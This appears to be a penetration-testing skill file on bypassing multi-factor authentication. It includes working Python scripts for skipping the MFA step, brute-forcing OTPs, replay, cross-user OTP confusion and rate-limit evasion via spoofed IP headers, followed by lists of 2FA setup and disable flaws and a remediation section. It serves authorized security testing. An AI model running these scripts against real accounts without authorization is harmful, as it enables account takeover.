---
name: mfa_bypass
description: Elite MFA bypass testing — code reuse, brute force, response manipulation, flow skipping, backup code attacks, OTP context confusion, and mandatory real-impact exploitation with proof of authentication bypass
---

# MFA Bypass — Full Authentication Bypass Testing

MFA bypass is a Critical/High severity finding when demonstrated end-to-end. The goal is not just to show a weakness exists — it is to PROVE you can authenticate as a victim user WITHOUT knowing their valid MFA code. Any bypass that requires only knowledge the attacker realistically has is reportable.

**CRITICAL RULE: MFA bypass must be proven end-to-end. "The OTP endpoint lacks rate limiting" alone is not sufficient — you must demonstrate actual authentication bypass or actual brute force viability.**

---

## Real Impact Gate — Answer Before Reporting

1. **Did you successfully bypass MFA and authenticate as a user without their MFA code?**
   ACCEPTABLE: "I skipped the MFA step and received a fully authenticated session token"
   ACCEPTABLE: "I brute-forced the OTP in N requests and authenticated as the victim"
   NOT ACCEPTABLE: "The OTP endpoint lacks rate limiting" (without demonstrating bypass)

2. **What is the actual impact?**
   - Complete authentication bypass → Critical
   - Account takeover without victim interaction → Critical
   - MFA brute-forceable in practice → High
   - OTP reuse after single use → Medium (requires knowing a recent OTP)

3. **Is a compensating control present?**
   - Account lockout after N failed MFA attempts → reduces severity significantly
   - CAPTCHA after N failures → reduces brute force viability

---

## Attack Surface

**Code Implementation Weaknesses:**
- TOTP/OTP not invalidated after successful use → replay attack
- Long validity window (> 30 seconds for TOTP, > 5 minutes for SMS OTP)
- OTP transmitted in HTTP response body or URL parameters
- Server-side OTP comparison susceptible to timing attacks

**Flow/Authorization Weaknesses:**
- MFA step skippable by directly requesting a protected resource
- Session token issued with full privileges BEFORE MFA completion
- `mfa_verified`, `mfa_complete`, `require_mfa` flag checked client-side only
- Different authentication paths (API vs UI) with inconsistent MFA enforcement
- Mobile app flows with MFA enforcement weaker than web app

**Rate Limiting Weaknesses:**
- No rate limiting on OTP submission endpoint
- Rate limit bypassable via X-Forwarded-For rotation
- Rate limit resets on new session creation
- No account lockout after N failed MFA attempts

**Recovery Weaknesses:**
- "Forgot MFA" flow bypasses MFA with weak identity verification (security questions)
- SMS OTP → SIM swap attack vector
- Backup codes not invalidated after use
- Backup codes retrievable via API without re-authentication
- Admin-initiated MFA reset without proper verification

**Context Confusion:**
- OTP submitted with different user_id than the one who initiated MFA
- OTP valid across multiple sessions (session ID not bound to OTP)
- OTP valid for multiple applications sharing the same TOTP secret

---

## Testing Methodology — Complete All Steps

### Step 1: MFA Flow Mapping
```python
# Before any bypass attempt, map the complete MFA flow
# Capture ALL HTTP requests during the MFA flow in proxy

mfa_flow_requests = {
    "step1_login": "POST /api/auth/login → receives session token (pre-MFA)",
    "step2_mfa_challenge": "POST /api/mfa/send-code OR GET /api/mfa/totp-required",
    "step3_mfa_verify": "POST /api/mfa/verify → {otp: '123456'}",
    "step4_full_access": "GET /api/user/profile → should only work after step 3",
}

# Key questions to answer:
# 1. Does step1 return a full session or a partial session?
# 2. Can you call step4 with the partial session from step1?
# 3. What happens if you skip step3 entirely?
```

### Step 2: MFA Step Skipping (HIGHEST PRIORITY TEST)
```python
import requests

def test_mfa_step_skipping(username, password, protected_endpoint):
    """
    Test if MFA can be skipped entirely by using the pre-MFA session
    to directly access protected resources.
    
    This is a Critical vulnerability if it works.
    """
    # Step 1: Log in and get pre-MFA session
    r1 = requests.post("https://target.com/api/auth/login",
        json={"email": username, "password": password})
    
    pre_mfa_session = r1.cookies.get("session") or \
                      r1.json().get("token") or \
                      r1.json().get("pre_mfa_token")
    
    print(f"Step 1 login: {r1.status_code}")
    print(f"Pre-MFA session obtained: {'YES' if pre_mfa_session else 'NO'}")
    print(f"Session value: {pre_mfa_session[:30] if pre_mfa_session else 'None'}...")
    
    # Step 2: WITHOUT completing MFA, try to access protected resource
    r2 = requests.get(
        f"https://target.com{protected_endpoint}",
        headers={"Cookie": f"session={pre_mfa_session}",
                 "Authorization": f"Bearer {pre_mfa_session}"}
    )
    
    print(f"\nStep 2 — Access protected resource WITHOUT MFA: {r2.status_code}")
    
    if r2.status_code == 200:
        print("✅ CRITICAL: MFA STEP SKIPPING CONFIRMED!")
        print(f"Accessed {protected_endpoint} without completing MFA")
        print(f"Response (first 500 chars): {r2.text[:500]}")
        
        # Print raw HTTP evidence
        print(f"\n[COMPLETE RAW HTTP REQUEST]")
        print(f"GET {protected_endpoint} HTTP/1.1")
        print(f"Host: target.com")
        print(f"Cookie: session={pre_mfa_session}  ← PRE-MFA SESSION (MFA NOT COMPLETED)")
        print(f"\n[COMPLETE RAW HTTP RESPONSE]")
        print(f"HTTP/1.1 {r2.status_code} OK")
        for h, v in r2.headers.items():
            print(f"{h}: {v}")
        print(f"\n{r2.text[:1000]}")
        print("[Contains protected data — accessed without MFA ← PROOF OF MFA BYPASS]")
        return True
    
    print(f"Protected: {r2.status_code} — MFA step skipping not successful")
    return False

# Also test by navigating directly to the post-MFA URL in the browser
# (simulates an attacker who knows the post-login redirect URL)
```

### Step 3: OTP Brute Force — Demonstrate Viability
```python
import asyncio, aiohttp, time
from collections import Counter

async def test_otp_brute_force_viability(verify_url, session_cookie, start=0, end=9999):
    """
    For 4-digit OTP: 10,000 codes. For 6-digit: 1,000,000 codes.
    Test rate limiting AND account lockout.
    
    HIGH severity ONLY if: no rate limit AND no lockout → brute force is practically viable.
    """
    test_codes = [str(i).zfill(4) for i in range(start, min(end, start + 200))]
    
    async def try_otp(session, code):
        try:
            async with session.post(
                verify_url,
                json={"otp": code},
                headers={"Cookie": f"session={session_cookie}"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                body = await r.text()
                return code, r.status, body
        except Exception as e:
            return code, 0, str(e)
    
    print(f"Testing {len(test_codes)} OTP codes at {verify_url}")
    print(f"Looking for rate limiting and lockout...")
    
    results = []
    async with aiohttp.ClientSession() as session:
        # Test in batches of 10 (simulate rapid brute force)
        for i in range(0, len(test_codes), 10):
            batch = test_codes[i:i+10]
            batch_results = await asyncio.gather(*[try_otp(session, code) for code in batch])
            results.extend(batch_results)
            
            statuses = Counter(r[1] for r in batch_results)
            print(f"Batch {i//10+1}: {dict(statuses)}")
            
            # Check for rate limiting
            if any(r[1] == 429 for r in batch_results):
                print(f"RATE LIMIT DETECTED at batch {i//10+1} (attempt {i+10})")
                print("Severity: LOW (rate limit present) unless it can be bypassed")
                break
            
            await asyncio.sleep(0.1)
    
    status_distribution = Counter(r[1] for r in results)
    print(f"\nFinal status distribution: {dict(status_distribution)}")
    
    blocked = status_distribution.get(429, 0) + status_distribution.get(403, 0)
    if blocked == 0:
        print("NO RATE LIMITING DETECTED")
        # Now check account lockout
        correct_otp_attempt = requests.post(verify_url,
            json={"otp": "known_correct_otp"},
            headers={"Cookie": f"session={session_cookie}"})
        
        if correct_otp_attempt.status_code not in [423, 429, 403]:
            print("✅ HIGH: No rate limit AND no lockout — OTP brute force is FULLY VIABLE")
            print(f"A 4-digit OTP can be brute forced in {10000/200:.0f} batches of 200 requests")
        else:
            print(f"Account locked after attempts: {correct_otp_attempt.status_code}")
            print("LOW: Account lockout compensates — brute force not practically viable")
    
    return status_distribution

asyncio.run(test_otp_brute_force_viability(
    "https://target.com/api/mfa/verify",
    "PRE_MFA_SESSION_COOKIE",
    start=0, end=200
))
```

### Step 4: OTP Replay Attack
```python
def test_otp_replay(verify_url, pre_mfa_session, valid_otp):
    """
    Test if an OTP that was already used can be reused.
    Medium severity — requires attacker to know a previously used code.
    """
    # First use — should succeed
    r1 = requests.post(verify_url,
        json={"otp": valid_otp},
        headers={"Cookie": f"session={pre_mfa_session}"})
    print(f"First OTP use: {r1.status_code}")
    
    if r1.status_code != 200:
        print("First use failed — cannot test replay")
        return False
    
    # Log out and start new pre-MFA session
    requests.post("https://target.com/api/auth/logout")
    new_session = login_and_get_pre_mfa_session()
    
    # Try to reuse the same OTP
    r2 = requests.post(verify_url,
        json={"otp": valid_otp},
        headers={"Cookie": f"session={new_session}"})
    print(f"OTP replay attempt: {r2.status_code}")
    
    if r2.status_code == 200:
        print("✅ MEDIUM: OTP REPLAY CONFIRMED — used OTP accepted again")
        return True
    
    print("OTP properly invalidated after first use")
    return False
```

### Step 5: Response Manipulation
```python
# Use proxy (Caido) to intercept and modify MFA verification response
# Test if changing {"success": false, "mfa_required": true} 
# to {"success": true, "mfa_required": false} grants access

# To test via code: simulate the response modification
def test_response_manipulation():
    """
    This test requires proxy interception.
    Instructions:
    1. Configure browser to use Caido proxy
    2. Navigate to MFA verification page
    3. Submit WRONG OTP code
    4. Intercept the response in Caido
    5. Modify response body: change "success":false to "success":true
    6. Forward modified response
    7. Check if application grants access despite failed MFA
    """
    pass
```

### Step 6: OTP Context Confusion
```python
def test_otp_user_context_confusion(verify_url, victim_user_id, attacker_session, attacker_otp):
    """
    Test if attacker can verify MFA on behalf of another user
    by substituting victim's user_id in the OTP verification request.
    """
    # Attacker submits their own valid OTP but with victim's user_id
    r = requests.post(verify_url,
        json={
            "otp": attacker_otp,
            "user_id": victim_user_id,  # ← Substituted victim's ID
        },
        headers={"Cookie": f"session={attacker_session}"})
    
    print(f"OTP context confusion test: {r.status_code}")
    if r.status_code == 200:
        print("✅ HIGH: OTP context confusion — attacker's OTP verified for victim's account!")
        print(f"Response: {r.text[:300]}")
        return True
    return False
```

### Step 7: Rate Limit Bypass Techniques (If Rate Limit Exists)
```python
def test_rate_limit_bypass_mfa(verify_url, session_cookie):
    """
    If rate limiting is present, test if it can be bypassed.
    Common bypass techniques for MFA rate limits.
    """
    bypass_headers = [
        {"X-Forwarded-For": "1.2.3.4"},
        {"X-Forwarded-For": "2.3.4.5"},
        {"X-Real-IP": "3.4.5.6"},
        {"X-Originating-IP": "4.5.6.7"},
        {"X-Remote-IP": "5.6.7.8"},
        {"X-Client-IP": "6.7.8.9"},
        {"True-Client-IP": "7.8.9.10"},
    ]
    
    for i, bypass_header in enumerate(bypass_headers):
        r = requests.post(verify_url,
            json={"otp": f"{i:04d}"},
            headers={"Cookie": f"session={session_cookie}", **bypass_header})
        print(f"Bypass with {bypass_header}: {r.status_code}")
        
        if r.status_code != 429:
            print(f"✅ RATE LIMIT BYPASS via {bypass_header}")
```

### Step 8: Backup Code Exposure and Reuse
```python
def test_backup_codes(auth_cookie):
    """
    Test if backup codes are exposed or reusable.
    """
    # Check if backup codes are readable without re-authentication
    r = requests.get("https://target.com/api/account/mfa/backup-codes",
        headers={"Cookie": auth_cookie})
    
    print(f"Backup codes endpoint: {r.status_code}")
    if r.status_code == 200 and "code" in r.text.lower():
        print("⚠️ Backup codes returned by API — check if they're plaintext")
        codes = extract_backup_codes(r.json())
        
        # Test if backup code can be reused after first use
        if codes:
            r1 = requests.post("https://target.com/api/mfa/verify-backup",
                json={"code": codes[0]})
            r2 = requests.post("https://target.com/api/mfa/verify-backup",
                json={"code": codes[0]})  # Second use
            
            if r2.status_code == 200:
                print("✅ MEDIUM: Backup code accepted on second use — not invalidated after use")
```

---

## Severity Classification

| Finding | Severity | Condition |
|---------|----------|-----------|
| MFA step completely skippable | **Critical** | Protected resources accessible with pre-MFA session |
| OTP brute force viable + no lockout | **High** | No rate limit AND no account lockout demonstrated with 500+ requests |
| Response manipulation grants access | **High** | Modifying {"mfa_required":true} to false bypasses MFA |
| OTP context confusion (cross-user) | **High** | Attacker's OTP used to authenticate as another user |
| OTP reuse after single use | **Medium** | Used OTP accepted again in new session |
| Backup code not invalidated | **Medium** | Same backup code works multiple times |
| Rate limit bypass enabling brute force | **High** | Rate limit exists but bypassable via IP rotation |
| Rate limit present, OTP brute force not practical | **Low/Info** | Rate limit mitigates the risk adequately |

---

## Mandatory Evidence Requirements

For MFA bypass findings, the report MUST include:

1. **Complete raw HTTP request** for the bypassing request (the exact attack payload)
2. **Complete raw HTTP response** showing successful authentication (200 + authenticated session token)
3. **UI reproduction steps** showing exactly how to replicate the bypass
4. **Before/after state**: unauthenticated → bypass → authenticated (with evidence of full authentication)
5. **Proof of full authentication**: accessing a protected resource that requires BOTH password AND MFA

---

## Remediation

- **Step skipping**: Issue pre-MFA session with limited scope; only upgrade to full session after MFA verification server-side
- **Brute force**: Rate limit to 5 attempts per minute; lockout after 10 consecutive failures; require CAPTCHA after 3 failures
- **OTP replay**: Mark OTP as consumed on first successful use; use sliding expiry windows for TOTP
- **Response manipulation**: Never make authentication decisions based on client-provided flags; enforce MFA state server-side
- **Backup codes**: Hash backup codes at rest; invalidate after single use; require re-authentication to view
- **Context confusion**: Bind OTP verification to the specific session and user who initiated the MFA challenge


## Additional Techniques — ported from WebSkills (2fa-test)

The core file above covers the **Bypass** surface. Two more attack surfaces exist — **Setup** and **Disable** — plus several bypass tricks not listed above. Walk all three; most 2FA findings are logic flaws, not crypto.

### 2FA Setup flaws
- **Secret not rotated / still obtainable after enable** — after enabling 2FA, look for a path (endpoint or JS) that still leaks the TOTP QR/secret; replay it to re-derive valid codes. (Bugcrowd VRT "2fa-secret-is-not-rotated")
- **Setup logic flaw via response manipulation** — during authenticator attach, submit a *wrong* code, intercept the response and flip it to success. If the app enables 2FA on a bad code, the victim can be locked out of their own account. (Distinct from post-login response manipulation already covered.)
- **Old session does not expire after enabling 2FA** — enable 2FA in browser A; a pre-existing session in browser B keeps full access with no 2FA prompt → an attacker who hijacked a pre-2FA session keeps it.
- **Enable 2FA without verifying email** — sign up with the victim's (unverified) email, log in without verifying, enable 2FA → victim can never register/reset into the account (denial of ownership). (HackerOne #649533)
- **IDOR → ATO on enable/verify** — register user1, note their ID; from user2's session send the 2FA-enable/verify request with **user1's ID**. If accepted, you enable and then verify 2FA on the victim's account. (HackerOne #810880)

### Extra bypass tricks (not in the main methodology above)
- **Code not updated after resend** — request a new code; if the old and new codes are identical the code space is effectively smaller / brute-forceable. (Bugcrowd VRT #289)
- **Null & default codes** — try `null`, `000000`, blank, `123456`, `%00` as the code/verify value.
- **Referrer-check / direct-request bypass** — navigate directly to the post-2FA authenticated page; if it loads, 2FA is enforced only by a `Referer`/redirect check. Also try forging `Referer` as if you came from the 2FA page.
- **Cross-account session-permission bypass** — start the 2FA flow with your account *and* the victim's in the same browser session; complete 2FA on **your** account but don't advance, then advance the victim's flow. If the backend only sets a boolean "passed-2FA" in the session, the victim's step is bypassed.
- **Changing the 2FA mode** — at verify, flip request fields like `"mode":"sms"→"email"` or `"secureLogin":true→false`; some backends only enforce one mode. (HackerOne #665722)
- **OAuth skips 2FA** — if "Login with Facebook/Google" logs the user in without ever hitting the 2FA prompt, the social path bypasses 2FA entirely. (HackerOne #178293)
- **Strip the 2FA cookie part** — remove only the cookie component responsible for the 2FA gate and replay. (HackerOne #2315420)

### Disable 2FA surface
- **No rate limit on disable** — the "confirm password to disable" step is often unthrottled; fuzz it. (HackerOne #1465277)
- **Disable via CSRF** — the disable-2FA endpoint frequently lacks CSRF protection; a cross-site POST (or a null-char token override submitted twice) turns off the victim's 2FA. (HackerOne #670329)
- **Password reset / email check disables 2FA** — enable 2FA, log out, run password reset, then log in — if no 2FA is requested after reset, reset silently strips 2FA.
- **Password not actually checked on disable** — submit the disable request with a valid authenticator/backup code but a *wrong* password; if it succeeds the password check is cosmetic. (HackerOne #587910)
- **Logic-bug disable** — replay the disable request against a sibling endpoint (e.g. `/api/user/two-factor/set`) with a mode/phone body to overwrite/disable without valid confirmation. (HackerOne #783258)
- **Backup-code abuse** — backup codes are often generated once and static; if a CORS/XSS bug lets you read the backup-code endpoint response, you steal them and bypass 2FA with known password. (HackerOne #113953, #100509)
- **Clickjacking the disable page** — if the disable-2FA page is framable, UI-redress a victim into turning off their own 2FA.
